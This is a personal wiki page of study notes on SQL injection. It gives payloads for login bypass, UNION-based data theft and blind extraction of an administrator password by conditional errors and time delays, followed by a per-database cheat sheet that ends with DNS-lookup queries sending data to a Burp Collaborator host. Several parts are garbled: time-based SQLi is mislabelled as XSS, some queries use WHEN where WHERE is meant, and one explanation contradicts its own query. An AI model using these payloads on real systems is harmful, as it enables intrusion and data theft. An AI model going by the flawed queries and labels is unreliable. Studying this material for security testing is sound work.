<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="SQL injection vulnerabilities occur when developers fail to properly sanitise the parameters in an SQL query that are provided by users."><title>SQL Injection</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://wiki.yigit.run//icon.png><link href=https://wiki.yigit.run/styles.ebd27fbf9e64c84384457cc1fc4908bd.min.css rel=stylesheet><link href=https://wiki.yigit.run/lib/fontawesome.min.6386fb409d4a2abc96eee7be8f6d4cc4.css rel=stylesheet><script src=https://wiki.yigit.run/js/gnuplot_api.8e1c31098e0ba119f7824a661b56d4a4.min.js></script>
<script>const gnuplot_link="/js/gnuplot.44eb85f3f3fb2223f46a016f467bd5b4.js"</script><script src=https://wiki.yigit.run/js/gnuplot_render.f03d1b9dc0e81e8e9b17ea995631e7ce.min.js></script>
<link href=https://wiki.yigit.run/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://wiki.yigit.run/js/darkmode.e3aca6602bdec0dc154f3dea3035dd75.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
<script src=https://wiki.yigit.run/js/popover.37b1455b8f0603154072b9467132c659.min.js></script>
<script src=https://wiki.yigit.run/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
<script>const BASE_URL="https://wiki.yigit.run/",fetchData=Promise.all([fetch("https://wiki.yigit.run/indices/linkIndex.05d8c90ec73c381ea160f2cfcedc6721.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://wiki.yigit.run/indices/contentIndex.11ec59539ba698f4305d38c6bed21c98.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const n=new URL(BASE_URL),s=n.pathname,o=window.location.pathname,i=s==o;addCopyButtons();const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=i&&!0;drawGraph("https://wiki.yigit.run",t,[{"/moc":"#4388cc"}],t?{centerForce:100,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.3,linkDistance:.1,opacityScale:3,repelForce:.1,scale:.7}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2}),initPopover("https://wiki.yigit.run",!0,!0)},init=(e=document)=>{addCopyButtons(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/wiki.yigit.run\/js\/router.b65d0bc2e726311cb6574ae9a7ad27fb.min.js"
    attachSPARouting(init, render)
  </script></head><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://wiki.yigit.run/js/search.cf33b507388f3dfd5513a2afcda7af41.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://wiki.yigit.run/>Neocortex ðŸ§ </a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>SQL Injection</h1><p class=meta>Last updated
Nov 16, 2021</p><ul class=tags><li><a href=https://wiki.yigit.run/tags/cs/security/>Cs security</a></li><li><a href=https://wiki.yigit.run/tags/cs/web/>Cs web</a></li><li><a href=https://wiki.yigit.run/tags/cs/databases/>Cs databases</a></li></ul><p>SQL injection vulnerabilities occur when developers fail to properly sanitise the parameters in an SQL query that are provided by users. You can use SQLi to leak data or mess with an application's logic.</p><a href=#burp-academy-sections><h2 id=burp-academy-sections><span class=hanchor arialabel=Anchor># </span>Burp Academy Sections</h2></a><a href=#retrieving-hidden-data><h3 id=retrieving-hidden-data><span class=hanchor arialabel=Anchor># </span>Retrieving hidden data</h3></a><p>Say a web app runs the following SQL query when the value of the parameter <em>q</em> is %s:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>products</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>category</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;%s&#39;</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=n>released</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>When a user sends the request with the parameter <code>?q=Gifts'</code>&ndash;= the server runs the SQL query:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>products</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>category</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;Gifts&#39;</span><span class=c1>--&#39; AND released = 1
</span></span></span></code></pre></td></tr></table></div></div><p>If we want the server to return everything, we can send the request <code>?q=Gifts'+OR+1=1--</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>products</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>category</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;Gifts&#39;</span><span class=w> </span><span class=k>OR</span><span class=w> </span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=c1>--&#39; AND released = 1
</span></span></span></code></pre></td></tr></table></div></div><a href=#messing-around-with-an-apps-logic><h3 id=messing-around-with-an-apps-logic><span class=hanchor arialabel=Anchor># </span>Messing around with an app's logic</h3></a><p>When a web application runs an SQL query when it tries log users in, it might use something like:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;yeet&#39;</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;pass&#39;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>An attacker can bypass such a mechanism by sending a request like <code>yeet'--</code> the app runs following SQL query:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;yeet&#39;</span><span class=c1>--&#39; AND password = &#39;pass&#39;
</span></span></span></code></pre></td></tr></table></div></div><a href=#getting-data-from-other-tables><h3 id=getting-data-from-other-tables><span class=hanchor arialabel=Anchor># </span>Getting data from other tables</h3></a><p>You can use the operator to retrieve data from other tables. Here is an example for <code>?q=Gifts' UNION SELECT * FROM users--</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;Gifts&#39;</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=c1>--&#39; AND password = &#39;pass&#39;
</span></span></span></code></pre></td></tr></table></div></div><a href=#examining-the-databse-in-cases-of-sqli><h3 id=examining-the-databse-in-cases-of-sqli><span class=hanchor arialabel=Anchor># </span>Examining the databse in cases of SQLi</h3></a><p>You can use the <em>information~schema~.tables</em> to get a list of tables from the database ans <code>SELECT * FROM v$version</code> to get the database version</p><a href=#blind-sql-injection><h3 id=blind-sql-injection><span class=hanchor arialabel=Anchor># </span>Blind SQL injection</h3></a><p>When you don't see data being reflected to you, there still might be SQL injection vulnerabilities.</p><a href=#union-attacks><h2 id=union-attacks><span class=hanchor arialabel=Anchor># </span>UNION Attacks</h2></a><p>The
<a href=https:www.w3schools.com/sql/sql_union.asp rel=noopener>UNION</a> operator in SQL is used to combine/concatenate the results of two queries into one. For a UNION query to b valid, two conditions must be met:</p><ul><li>Both the queries must have the same number of columns</li><li>The data types of each column must be compatible</li></ul><p>Therefore, to carry out a successful UNION based attack you must know how many columns are being returned by the database and which columns in the query have a suitable type with your injected query.</p><a href=#determining-the-number-of-columns><h3 id=determining-the-number-of-columns><span class=hanchor arialabel=Anchor># </span>Determining the number of columns</h3></a><p>You can use two methods to figure out the number of columns:</p><ol><li><p>ORDER BY</p><p>You can make several order by queries and the number of columns that the query has is one less than the value of the <code>ORDER BY</code> query we ran. For instance if an app throws an error at <code>ORDER BY 6</code>, than it has 5 columns.</p></li><li><p>UNION</p><p>You can also use the UNION operator with <em>n</em> number of NULL fields. The application throws an error until the number of NULL fields in the <code>UNION SELECT</code> match exactly the number of columns in the original query.</p></li></ol><a href=#figuring-out-column-types><h3 id=figuring-out-column-types><span class=hanchor arialabel=Anchor># </span>Figuring out column types</h3></a><p>In order to detect data types of columns, we can again use the UNION operator after determining the number of columns. You can use NULL fields and add a field of known type, checking for errors. If no errors occurs, than that column's data type is that field. An example sequence of test requests could look like:</p><pre><code>' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
</code></pre><a href=#retrieving-multiple-values-in-a-single-column-in-union-attacks><h3 id=retrieving-multiple-values-in-a-single-column-in-union-attacks><span class=hanchor arialabel=Anchor># </span>Retrieving Multiple Values in a Single Column in UNION Attacks</h3></a><p>You can use concatenation techniques to combine two columns of data into one.</p><a href=#blind-sql-injection-1><h2 id=blind-sql-injection-1><span class=hanchor arialabel=Anchor># </span>Blind SQL Injection</h2></a><p>Sometimes SQL injection vulnerabilities might occur even if you don't see the output of the queries you run. In those cases, it can be tested by using SLEEP operators, conditional responses and external service interaction.</p><a href=#using-conditional-responses><h3 id=using-conditional-responses><span class=hanchor arialabel=Anchor># </span>Using Conditional Responses</h3></a><p>In MySQL you can use SUBSTRING operator to compare a character at a certain point, for instance you can use the following SQL query to check whether the first char of password is less than k:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sessions</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>cookie</span><span class=o>=</span><span class=s1>&#39;xyz&#39;</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=k>SUBSTRING</span><span class=p>((</span><span class=k>SELECT</span><span class=w> </span><span class=n>Password</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>Users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>Username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;Administrator&#39;</span><span class=p>),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;s&#39;</span><span class=c1>-- AND username=&#39;yeet&#39;
</span></span></span></code></pre></td></tr></table></div></div><p>You can also figure out the length of a response by using:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sessions</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>cookie</span><span class=o>=</span><span class=s1>&#39;xyz&#39;</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=s1>&#39;a&#39;</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>Users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>Username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;Administrator&#39;</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=k>LENGTH</span><span class=p>(</span><span class=n>Password</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=c1>-- AND username=&#39;yeet&#39;
</span></span></span></code></pre></td></tr></table></div></div><p>You can use the Burp Suite's <em>Cluster Bomb</em> attack type to exploit blind XSS.</p><a href=#conditional-responses-using-errors><h3 id=conditional-responses-using-errors><span class=hanchor arialabel=Anchor># </span>Conditional Responses Using Errors</h3></a><p>If the previous method doesn't work, we can induce an error in the target system if an error a different response to be returned by the server. Here is an example</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sessions</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>cookie</span><span class=o>=</span><span class=s1>&#39;xyz&#39;</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=k>CASE</span><span class=w> </span><span class=k>WHEN</span><span class=w> </span><span class=p>(</span><span class=k>SUBSTRING</span><span class=p>(</span><span class=n>Password</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=s1>&#39;m&#39;</span><span class=p>)</span><span class=w> </span><span class=k>THEN</span><span class=w> </span><span class=mi>1</span><span class=o>/</span><span class=mi>0</span><span class=w> </span><span class=k>ELSE</span><span class=w> </span><span class=s1>&#39;a&#39;</span><span class=w> </span><span class=k>END</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>Users</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=w> </span><span class=k>WHEN</span><span class=w> </span><span class=n>Username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;Administrator&#39;</span><span class=w> </span><span class=c1>-- AND username=&#39;yeet&#39;
</span></span></span></code></pre></td></tr></table></div></div><p>If the first character is greater than 1, the SQL query tries to divide by 0 which throws an error. There are different methods and techniques you can use for each database type.</p><a href=#using-time-delays><h3 id=using-time-delays><span class=hanchor arialabel=Anchor># </span>Using Time Delays</h3></a><p>If a web application doesn't reflect any indication about the query, we can still create conditionals time delays on the servers, and this can be used to leak information. When you use Burp Suite to exploit time-based blind XSS, you must force intruder to run in single-threaded mode.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sessions</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>cookie</span><span class=o>=</span><span class=s1>&#39;xyz&#39;</span><span class=p>;</span><span class=w> </span><span class=k>IF</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=k>CASE</span><span class=w> </span><span class=k>WHEN</span><span class=w> </span><span class=p>(</span><span class=k>SUBSTRING</span><span class=p>(</span><span class=n>Password</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=s1>&#39;m&#39;</span><span class=p>)</span><span class=w> </span><span class=k>THEN</span><span class=w> </span><span class=n>sleep</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span><span class=w> </span><span class=k>ELSE</span><span class=w> </span><span class=n>sleep</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=k>END</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>Users</span><span class=w> </span><span class=k>WHEN</span><span class=w> </span><span class=n>Username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;Administrator&#39;</span><span class=w> </span><span class=c1>-- AND username=&#39;yeet&#39;
</span></span></span></code></pre></td></tr></table></div></div><p>Of course, the techniques to trigger time delays may differ between different database types.</p><a href=#blind-sql-injection-with-out-of-band-techniques><h3 id=blind-sql-injection-with-out-of-band-techniques><span class=hanchor arialabel=Anchor># </span>Blind SQL injection with Out-Of-Band techniques</h3></a><p>In the cases where no info about the result of the output is reflected in the response and the server runs the query asynchronously, there is no way to detect whether your injection was successful. In those cases, you can trigger out-of-band network interactions with the query to test whether your injection was successful. Combining this interaction with conditions, you can leak data. The techniques to trigger such interactions change drastically depending on the type of database being used in the back-end server, you can find a list of database-specific payloads in [<em>DNS Data Exfiltration</em>]{.spurious-link target=&ldquo;DNS Data Exfiltration&rdquo;}</p><a href=#second-order-sql-injection><h2 id=second-order-sql-injection><span class=hanchor arialabel=Anchor># </span>Second Order SQL injection</h2></a><p>Sometimes a web application records data sent by a user and saves ot temporarily, afterwards, perhaps after a certain amount of time, it uses this user input without sanitizing it in an SQL Query. This is called a second order SQL injection and can be detected using [<em>Blind SQL injection with Out-Of-Band techniques</em>]{.spurious-link target="*Blind SQL injection with Out-Of-Band techniques"}.</p><a href=#tips--tricks><h2 id=tips--tricks><span class=hanchor arialabel=Anchor># </span>Tips & Tricks</h2></a><a href=#string-concatenation><h3 id=string-concatenation><span class=hanchor arialabel=Anchor># </span>String concatenation</h3></a><ul><li><em>Oracle</em> <code>'foo'||'bar'</code></li><li><em>Microsoft</em> <code>'foo'+'bar'</code></li><li><em>PostgreSQL</em> <code>'foo'||'bar'</code></li><li><em>MySQL</em> <code>CONCAT('foo','bar')</code></li></ul><a href=#substring><h3 id=substring><span class=hanchor arialabel=Anchor># </span>Substring</h3></a><ul><li><em>Oracle</em> <code>SUBSTR('foobar', 4, 2)</code></li><li><em>Microsoft</em> <code>SUBSTRING('foobar', 4, 2)</code></li><li><em>PostgreSQL</em> <code>SUBSTRING('foobar', 4, 2)</code></li><li><em>MySQL</em> <code>SUBSTRING('foobar', 4, 2)</code></li></ul><a href=#comments><h3 id=comments><span class=hanchor arialabel=Anchor># </span>Comments</h3></a><ul><li><em>Oracle</em> <code>--comment</code></li><li><em>Microsoft</em> <code>--comment</code> <code>/*comment*/</code></li><li><em>PostgreSQL</em> <code>--comment</code> <code>/*comment*/</code></li><li><em>MySQL</em> <code>--[space]comment</code> <code>/*comment*/</code> <code>#comment</code></li></ul><a href=#get-version><h3 id=get-version><span class=hanchor arialabel=Anchor># </span>Get Version</h3></a><ul><li><em>Oracle</em> <code>SELECT banner FROM v$version</code> OR <code>SELECT version FROM v$instance</code></li><li><em>Microsoft</em> <code>SELECT @@version</code></li><li><em>PostgreSQL</em> <code>SELECT version()</code></li><li><em>MySQL</em> <code>SELECT @@version</code></li></ul><a href=#database-content><h3 id=database-content><span class=hanchor arialabel=Anchor># </span>Database Content</h3></a><ul><li><em>Oracle</em> <code>SELECT * FROM all_tables</code> AND <code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></li><li><em>Microsoft</em> <code>SELECT * FROM information_schema.tables</code> AND <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></li><li><em>PostgreSQL</em> <code>SELECT * FROM information_schema.tables</code> AND <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></li><li><em>MySQL</em> <code>SELECT * FROM information_schema.tables</code> AND <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code></li></ul><a href=#conditional-errors><h3 id=conditional-errors><span class=hanchor arialabel=Anchor># </span>Conditional errors</h3></a><ul><li><em>Oracle</em> <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code></li><li><em>Microsoft</em> <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></li><li><em>PostgreSQL</em> <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></li><li><em>MySQL</em> <code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></li></ul><a href=#stacking-queries><h3 id=stacking-queries><span class=hanchor arialabel=Anchor># </span>Stacking Queries</h3></a><ul><li><em>Oracle</em> <code>No support</code></li><li><em>Microsoft,PostgreSQL,MySQL</em> <code>QUERY-1-HERE; QUERY-2-HERE</code></li></ul><a href=#delays><h3 id=delays><span class=hanchor arialabel=Anchor># </span>Delays</h3></a><ul><li><em>Oracle</em> <code>dbms_pipe.receive_message(('a'),10)</code></li><li><em>Microsoft</em> <code>WAITFOR DELAY '0:0:10'</code></li><li><em>PostgreSQL</em> <code>SELECT pg_sleep(10)</code></li><li><em>MySQL</em> <code>SELECT sleep(10)</code></li></ul><a href=#conditional-delays><h3 id=conditional-delays><span class=hanchor arialabel=Anchor># </span>Conditional Delays</h3></a><ul><li><em>Oracle</em> <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></li><li><em>Microsoft</em> <code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></li><li><em>PostgreSQL</em> <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></li><li><em>MySQL</em> <code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')</code></li></ul><a href=#dns-lookup><h3 id=dns-lookup><span class=hanchor arialabel=Anchor># </span>DNS Lookup</h3></a><ul><li><em>Oracle</em></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=n>xmltype</span><span class=p>(</span><span class=s1>&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &#34;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&#34;&gt; %remote;]&gt;&#39;</span><span class=p>),</span><span class=s1>&#39;/l&#39;</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dual</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>OR</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>UTL_INADDR</span><span class=p>.</span><span class=n>get_host_address</span><span class=p>(</span><span class=s1>&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;</span><span class=p>)</span><span class=w>
